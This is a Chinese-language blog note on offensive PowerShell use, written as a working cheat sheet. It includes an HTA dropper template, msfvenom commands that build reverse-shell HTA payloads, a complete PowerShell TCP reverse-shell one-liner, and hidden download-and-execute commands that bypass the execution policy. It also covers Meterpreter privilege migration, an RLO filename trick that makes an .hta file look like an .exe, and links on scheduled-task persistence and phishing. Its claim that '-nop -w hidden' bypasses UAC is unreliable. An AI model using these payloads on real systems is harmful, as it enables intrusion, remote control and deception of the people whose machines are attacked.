Title: powershell的利用
Category: Learning
Date: 2017-5-12
slug: powershell


##powershell+hta
<http://www.freebuf.com/sectool/90362.html>

新建立一个hta文件，比如是如下内容：

```
<title>XXX-exp</title>
<center>
<h1>XXX-exp: death.exe</h1>
<br>
<h2>Loading...</h2>
<br>
[<marquee scrollAmount=4 width=350 direction=right>|||||||||||||</marquee>]35%
<br>
</center>
<script language="VBScript">
  Set Hackdo = CreateObject("Wscript.Shell")
  Set Check = CreateObject("Scripting.FileSystemObject")
  If Check.FileExists(Hackdo.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then
    Hackdo.Run "powershell.exe -nop -w hidden calc.exe"
  End If
</script>
```
其中windows会执行script标签里面的内容，然后这部分可以替换一个反弹的代码，使用msf生成：

`msfvenom -p windows/meterpreter/reverse_tcp lhost=175.xxx.xxx.xxx lport=8081 -f hta-psh -o test.hta`

或者这样：

`msfvenom -p windows/shell_reverse_tcp LHOST=192.xx.xx.xx  LPORT=5555 -f hta-psh >test.hta`

然后把script标签里面的内容拷贝到上面script对应的部分，保存为hta，监听端口之后只要打开hta即可获取shell。

如果需要运行之后退出，可以这样：

比如创建了一个hack的`Wscript.Shell`对象，最后加上这句话
`hack.Run "taskkill /f /im mshta.exe"`即可退出，但是session还在等。

* 如果获取的是msf的shell，`getuid`查看当前权限，然后使用`ps`列出进程可以看到pid和对应的进程名称，然后使用`migrate [pid]`迁移到对应权限的进程，然后就权限随之改变。
* 
```
这只是个弹计算器的脚本，大可拷贝下来实际操作一遍，拷贝，新建txt文档，打开，粘贴并保存为名称deexe.hta，右键重命名，光标放在de和exe.hta之间点击右键，选择插入Unicode控制符，点击插入RLO，最后就可以获取一个看起来像exe的文件
```

##powershell的运行

一般情况下系统禁止powershell运行，可以进入powershell之后查看当前系统的策略：

```
PS E:> Get-ExecutionPolicy
Restricted
PS E:> Set-ExecutionPolicy UnRestricted
```

##nishang

<https://github.com/samratashok/nishang>

下载之后cmd输入powershell进入ps，然后加载nishang的脚本`Import-Module .\nishang.psm1`

加载之后就可以使用各种脚本，比如其中的TCP反弹脚本

`Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port x`


###在cmd下如何执行一个反弹脚本

`powershell.exe -file tcp.ps1`


```
$client = New-Object System.Net.Sockets.TCPClient("x.x.x.x",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

在实战环境中最好使用如下的方式运行powershell

####cmd下运行：

`PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File d:\Invoke-PowerShellUdp.ps1`

`PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ip/ps1')`

####powershell运行：

`IEX(New-Object Net.WebClient).DownloadString('http://ip/ps1')`


＝＝＝＝

第一篇：
windows 定时任务反弹shell
https://support.microsoft.com/zh-cn/help/313565/how-to-use-the-at-command-to-schedule-tasks  
https://www.kancloud.cn/summer/windows_schtasks/77988  定时任务
windows的定时任务结合dnscat2，不用配置域名服务器，直接链接服务器。
http://wooyun.jozxing.cc/static/drops/tips-6090.html  powershell反弹姿势
(New-Object System.Net.Webclient).DownloadFile("http://127.0.0.1/kms.txt","D:\1.txt") powershell下载文件
http://www.freebuf.com/articles/system/93829.html  powsershell绕过限制策略
at定时任务下载执行反弹脚本，不用下载到硬盘 最后只需要一个定时任务即可
regsvr32 /s /u ms17010.dll  执行dll文件
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')" 网上下载并且执行ps脚本
http://www.freebuf.com/sectool/89918.html 有一个一行的TCP反弹脚本
http://www.freebuf.com/sectool/90191.html  UDP反弹脚本

PowerShell.exe -ExecutionPolicy Bypass -File .\script.ps1 powershell这样执行
实战环境中可以这样：
PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File d:\Invoke-PowerShellUdp.ps1

-nop -w hidden 后，能强行绕过UAC执行命令。 
http://www.freebuf.com/sectool/90362.html powershell+ hta
http://blog.zer01.net/?p=65 powershell在渗透过程中的使用方法
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 TCP的ps反弹脚本
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 nc的powershell
http://0cx.cc/about_powershell.jspx 各种各样的反弹脚本
http://www.freebuf.com/sectool/131275.html

C:\Inetpub\AdminScrip
cscript.exe adsutil.vbs enum w3svc/1/root”，看看Web服务器的配置



第二篇：php－fpm的原理

第三篇：使用email或者chm等钓鱼
https://evi1cg.me/archives/Powershell_client.html powershell钓鱼

<https://improsec.com/blog//babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell>
